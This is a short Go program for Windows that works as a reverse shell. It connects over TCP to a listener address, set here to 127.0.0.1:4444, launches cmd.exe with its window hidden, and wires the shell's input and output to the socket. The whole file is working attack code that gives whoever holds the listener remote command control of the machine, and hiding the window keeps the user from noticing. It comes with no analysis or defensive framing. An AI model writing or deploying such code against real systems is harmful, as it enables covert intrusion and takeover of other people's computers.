//go:build windows

package main

import (
	"net"
	"os/exec"
)

var listernerAddr = "127.0.0.1:4444"

func main() {
	// establish connection
	conn, err := net.Dial("tcp", listernerAddr)
	if err != nil {
		return
	}
	defer conn.Close()
	// spawn cmd
	cmd := exec.Command("cmd.exe")

	hideWindow(cmd)
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
